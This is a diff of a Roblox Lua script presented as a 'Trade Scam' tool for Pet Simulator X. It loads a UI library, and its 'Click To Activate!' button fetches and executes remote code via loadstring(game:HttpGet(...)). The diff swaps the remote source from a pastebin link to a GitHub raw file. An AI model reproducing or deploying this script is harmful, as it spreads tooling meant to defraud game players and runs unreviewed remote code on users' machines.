@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("[ New Year!] Pet Simulator X! 🐾 - Trade Scam V5.3", "Midgnight")
+local Window = Library.CreateLib("[New Year!] Pet Simulator X! 🐾 - Trade Scam V5.3", "Synapse")
     -- MAIN
     local Main = Window:NewTab("Credits")
     local MainSection = Main:NewSection("Script Made By LoupFoup")
@@ -9,6 +9,5 @@ local Window = Library.CreateLib("[ New Year!] Pet Simulator X! 🐾 - Trade Sca
 
     MainSection:NewButton("Click To Activate!", "Made by LoupFoup", function()
    
-  loadstring(game:HttpGet('https://pastebin.com/raw/gAXLfY9C'))()
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/FAHD-DEV/Loup/main/script.info'))()
       end)
-
